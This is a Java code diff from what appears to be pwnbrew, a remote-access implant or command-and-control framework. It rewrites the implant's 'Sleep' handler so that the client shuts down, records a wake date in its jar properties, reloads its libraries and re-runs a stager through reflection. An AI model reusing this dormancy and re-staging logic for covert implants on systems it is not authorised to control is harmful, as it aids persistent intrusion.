@@ -47,19 +47,18 @@ package pwnbrew.network.control.messages;
 
 import java.io.File;
 import java.io.UnsupportedEncodingException;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
 import java.text.ParseException;
 import java.util.Calendar;
 import java.util.Date;
 import java.util.logging.Level;
-import pwnbrew.ClientConfig;
 import pwnbrew.log.RemoteLog;
 import pwnbrew.manager.CommManager;
 import pwnbrew.misc.Constants;
-import pwnbrew.misc.DebugPrinter;
 import pwnbrew.misc.LoaderUtilities;
-import pwnbrew.misc.ReconnectTimer;
 import pwnbrew.misc.Utilities;
-import pwnbrew.network.ClientPortRouter;
 import pwnbrew.network.ControlOption;
 
 /**
@@ -176,27 +175,33 @@ public class Sleep extends ControlMessage {
                 File theClassPath = Utilities.getClassPath(); 
                 String properties = Constants.PROP_FILE;
                 String propLabel = Constants.SLEEP_LABEL;
-                
-                //Close the loader
-                Utilities.restart( passedManager, false, 5000 );               
-                
-                LoaderUtilities.unloadLibs( aClassLoader );
-                Utilities.updateJarProperties( theClassPath, properties, propLabel, dateStr );
-                 
-            } else {
-                
-                //Tell it not to reconnect
-                DebugPrinter.printMessage(NAME_Class, "Shutting down");
-                ClientPortRouter aCPR = (ClientPortRouter)passedManager.getPortRouter(ClientConfig.getConfig().getSocketPort());
-                aCPR.setReconnectFlag( false );
-                passedManager.disconnect();
-             
-                //Get the sleep time
-                String newSleepTime = Constants.CHECKIN_DATE_FORMAT.format( aCalendar.getTime() );
-                              
-                ReconnectTimer aReconnectTimer = ReconnectTimer.getReconnectTimer();
-                aReconnectTimer.addReconnectTime(newSleepTime);
-                aReconnectTimer.start();
+                                
+                try {
+            
+                    //Get the stager class
+                    String svcStr = "";
+                    Field aField = stagerClass.getField("serviceName");
+                    Object anObj = aField.get(null);
+                    if( anObj != null && anObj instanceof String ){
+                        //Cast to string
+                        svcStr = (String)anObj;
+                    }
+
+                    //Shutdown the client
+                    passedManager.shutdown();
+                    
+                    //Unload the libraries
+                    LoaderUtilities.unloadLibs( aClassLoader );
+                    Utilities.updateJarProperties( theClassPath, properties, propLabel, dateStr );
+                    LoaderUtilities.reloadLib(theClassPath);
+
+                    //Call the stager main function
+                    Method aMethod = stagerClass.getMethod( "main", new Class[]{ String[].class } );
+                    aMethod.invoke(null, new Object[] { new String[]{ svcStr } });
+
+                } catch (NoSuchMethodException | SecurityException | IllegalAccessException | IllegalArgumentException | InvocationTargetException | NoSuchFieldException ex) {
+                    RemoteLog.log(Level.WARNING, NAME_Class, "evaluate()", ex.getMessage(), ex);    
+                }
                 
             }             
             
